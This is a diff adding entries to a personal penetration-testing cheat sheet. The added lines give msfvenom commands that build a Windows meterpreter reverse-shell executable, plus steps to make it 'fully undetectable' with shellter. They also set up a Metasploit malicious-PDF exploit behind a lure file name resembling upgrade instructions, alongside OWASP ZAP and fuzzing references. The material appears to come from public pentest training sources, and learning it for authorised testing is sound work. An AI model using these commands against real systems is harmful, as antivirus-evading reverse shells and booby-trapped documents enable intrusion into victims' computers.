@@ -126,7 +126,7 @@
 Black or White box testing
 vulnerability assessment versus penetration testing
 Open Source Security Testing Mewthodology Manual (OSSTMM)
-Open Web Application Security Project (OWASP)
+Open Web Application Security Project (OWASP  owasp-zap tool )
 Web Application Security Consortium threat Classification (WASC-TC)
 Penetration Testing Execution Standard (PTES)  -> pre engagement, intelligence gathering , threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting
 General Penetration Testing Framework -
@@ -461,6 +461,26 @@ exploit              # run exploit and start to listening to the android
 # run and install .apk file
 meterpreter>sysinfo                       # we got meterpreter session
 
+# file format
+#------------------------------------------------------------------------------
+# https://resources.infosecinstitute.com/how-to-attack-windows-10-machine-with-metasploit-on-kali-linux/#gref
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 -platform windows -f exe LHOST=192.168.100.4 LPORT=4444 -o ~/Desktop/something32.exe
+# making the Executable Fuly Endetectable -> Executable FUD
+sudo apt-get install shellter
+shellter    # run in stealth mode - select yes
+            # 1 -> meterpreter_reverse_tcp
+            # LHOST LPORT
+set up listenrer in msfconsole
+
+# file format pdf, msfconsole
+#------------------------------------------------------------------------------
+# https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME BestComputers-UpgradeInstructions.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+# Test web applcation
+#------------------------------------------------------------------------------
+owasp-zap
 
 # MSFconsole
 #------------------------------------------------------------------------------
@@ -914,4 +934,10 @@ https://github.com/kgretzky/evilginx2
 # Kubernetes
 #------------------------------------------------------------------------------
 https://www.youtube.com/watch?v=ivmn1Oay41g
+
+
+# Egghunter Exploitation
+# https://resources.infosecinstitute.com/buffer-overflow-vulnserver/
+#------------------------------------------------------------------------------
+# fuzzy testing
 
